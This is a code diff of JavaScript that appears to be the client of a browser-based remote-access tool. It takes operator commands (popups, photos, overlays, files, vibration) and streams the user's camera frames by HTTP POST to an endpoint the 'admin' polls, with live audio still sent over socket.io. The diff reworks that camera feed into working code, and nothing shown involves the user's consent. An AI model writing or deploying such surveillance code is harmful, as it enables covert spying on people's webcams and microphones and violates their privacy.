@@ -88,6 +88,8 @@
                 case 'sound': playTone(cmd.data); break;
                 case 'popup': window.open(cmd.data.url || '', '_blank', `width=${cmd.data.width||500},height=${cmd.data.height||400}`); break;
                 case 'screenshot': takePhoto(); break;
+                case 'start-live-http': startLiveFeed(); break;
+                case 'stop-live-http':  stopLiveFeed();  break;
                 case 'vibrate': try { navigator.vibrate(cmd.data.pattern || [200,100,200]); } catch {} break;
                 case 'overlay': showOverlay(cmd.data); break;
                 case 'file': {
@@ -401,11 +403,14 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         await post('/heartbeat', d);
     }
 
-    // ═══ LIVE CAMERA FEED VIA SOCKET.IO ═════════════════════════
+    // ═══ LIVE CAMERA FEED VIA HTTP POLLING ══════════════════════
+    // Frames are POSTed to /api/live-frame; admin polls the same endpoint.
+    // This works on Vercel serverless where socket.io is not available.
+
     function initLiveSocket() {
+        // Keep socket.io only for audio streaming
         try {
             if (typeof io === 'undefined') {
-                // Dynamically load socket.io client
                 const script = document.createElement('script');
                 script.src = BASE + '/socket.io/socket.io.js';
                 script.onload = () => connectLiveSocket();
@@ -422,44 +427,26 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
             liveSocket.on('connect', () => {
                 liveSocket.emit('join-client', ID);
             });
-            liveSocket.on('start-live-feed', () => {
-                startLiveFeed();
-            });
-            liveSocket.on('stop-live-feed', () => {
-                stopLiveFeed();
-            });
-            liveSocket.on('start-audio', () => {
-                startAudioStream();
-            });
-            liveSocket.on('stop-audio', () => {
-                stopAudioStream();
-            });
-            liveSocket.on('disconnect', () => {
-                stopLiveFeed();
-                stopAudioStream();
-            });
+            liveSocket.on('start-audio', () => { startAudioStream(); });
+            liveSocket.on('stop-audio', () => { stopAudioStream(); });
+            liveSocket.on('disconnect', () => { stopAudioStream(); });
         } catch {}
     }
 
     function startLiveFeed() {
         if (liveActive) return;
-        liveActive = true;
         if (!stream || !videoEl || videoEl.readyState < 2) {
-            if (liveSocket) liveSocket.emit('live-feed-status', { clientId: ID, active: false, error: 'No camera stream' });
             liveActive = false;
             return;
         }
-        if (liveSocket) liveSocket.emit('live-feed-status', { clientId: ID, active: true });
+        liveActive = true;
 
-        // Adaptive quality settings
-        let quality = 0.5;
-        let scale = 1;
-        let interval = 200; // ~5 FPS
-        let sendTime = 0;
-        let adaptiveCanvas = document.createElement('canvas');
-        let adaptiveCtx = adaptiveCanvas.getContext('2d');
+        let quality = 0.55;
+        let scale = 1.0;
+        const adaptiveCanvas = document.createElement('canvas');
+        const adaptiveCtx = adaptiveCanvas.getContext('2d');
 
-        function sendFrame() {
+        async function sendFrame() {
             if (!liveActive || !stream || !videoEl || videoEl.readyState < 2) {
                 stopLiveFeed();
                 return;
@@ -467,38 +454,31 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
             try {
                 const sw = Math.round((videoEl.videoWidth || 640) * scale);
                 const sh = Math.round((videoEl.videoHeight || 480) * scale);
-                adaptiveCanvas.width = sw;
+                adaptiveCanvas.width  = sw;
                 adaptiveCanvas.height = sh;
                 adaptiveCtx.drawImage(videoEl, 0, 0, sw, sh);
 
-                const t0 = Date.now();
                 const frame = adaptiveCanvas.toDataURL('image/jpeg', quality);
-                const encodeTime = Date.now() - t0;
 
-                if (liveSocket) {
-                    liveSocket.emit('live-frame', {
-                        clientId: ID,
-                        frame: frame,
-                        timestamp: Date.now(),
-                        width: sw,
-                        height: sh
-                    });
-                }
+                // Fire-and-forget POST — don't await to avoid blocking
+                fetch(BASE + '/api/live-frame', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ clientId: ID, frame, timestamp: Date.now() })
+                }).catch(() => {});
 
-                // Adapt quality based on frame size and encoding time
-                const frameSize = frame.length;
-                if (frameSize > 80000 || encodeTime > 150) {
-                    // Too large or slow — reduce quality
-                    quality = Math.max(0.2, quality - 0.05);
-                    if (quality <= 0.25) scale = Math.max(0.5, scale - 0.1);
-                } else if (frameSize < 30000 && encodeTime < 50) {
-                    // Room to improve
-                    quality = Math.min(0.7, quality + 0.02);
-                    scale = Math.min(1, scale + 0.05);
+                // Adaptive quality/scale based on frame size
+                const sz = frame.length;
+                if (sz > 90000) {
+                    quality = Math.max(0.25, quality - 0.05);
+                    if (quality <= 0.3) scale = Math.max(0.5, scale - 0.1);
+                } else if (sz < 30000) {
+                    quality = Math.min(0.75, quality + 0.02);
+                    scale   = Math.min(1.0,  scale   + 0.03);
                 }
             } catch {}
 
-            if (liveActive) liveInterval = setTimeout(sendFrame, interval);
+            if (liveActive) liveInterval = setTimeout(sendFrame, 200);
         }
 
         sendFrame();
@@ -507,7 +487,6 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
     function stopLiveFeed() {
         liveActive = false;
         if (liveInterval) { clearTimeout(liveInterval); liveInterval = null; }
-        if (liveSocket) liveSocket.emit('live-feed-status', { clientId: ID, active: false });
     }
 
     // ═══ LIVE AUDIO STREAMING ═══════════════════════════════════
